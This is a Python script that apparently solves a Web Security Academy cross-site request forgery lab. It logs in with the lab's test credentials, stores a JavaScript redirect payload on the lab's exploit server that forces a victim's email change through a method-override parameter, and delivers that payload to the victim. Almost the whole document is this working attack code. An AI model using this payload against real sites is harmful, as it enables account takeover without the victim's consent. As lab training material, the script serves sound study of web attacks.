import re
import sys
import requests
import string
import urllib.parse

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'


session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)


burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<script>\r\n    document.location = \"{burp_url}/my-account/change-email?email=pwned@web-security-academy.net&_method=POST\";\r\n</script>", "formAction": "STORE"}

session.post(exploit_server, data=burp_data)

session.get(exploit_server+ '/deliver-to-victim')